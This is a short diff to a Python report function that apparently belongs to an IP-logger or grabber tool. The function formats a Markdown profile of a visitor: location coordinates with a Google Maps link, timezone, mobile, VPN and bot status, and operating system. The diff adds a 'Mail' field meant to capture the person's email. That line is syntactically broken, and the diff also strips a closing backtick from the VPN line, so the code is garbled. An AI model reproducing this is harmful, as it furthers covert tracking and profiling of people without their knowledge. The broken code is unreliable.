@@ -160,8 +160,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
+> **VPN:** `{info['proxy']}
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Mail** `{gmail['mail'] if info] {info['mail'] if info['mail'] else 'Unknown'}`
 
 **PC Info:**
 > **OS:** `{os}`
